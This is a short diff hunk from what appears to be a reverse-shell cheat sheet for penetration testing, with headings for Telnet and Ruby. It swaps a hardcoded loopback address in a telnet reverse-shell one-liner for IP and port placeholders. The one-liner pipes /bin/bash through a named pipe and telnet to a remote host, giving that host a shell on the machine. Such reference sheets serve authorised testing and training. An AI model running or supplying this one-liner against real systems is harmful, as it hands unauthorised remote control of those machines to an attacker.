@@ -519,7 +519,7 @@ Metasploit handlers can be great at quickly setting up Metasploit to be in a pos
 
 <b>Telnet:</b>
 
-	mknod /tmp/yyy p && /bin/bash 0</tmp/yyy | telnet 127.0.0.1 443 1>/tmp/yyy
+	mknod /tmp/yyy p && /bin/bash 0</tmp/yyy | telnet <[IP]> <[PORT]> 1>/tmp/yyy
 	
 <b>Ruby:</b>
 	
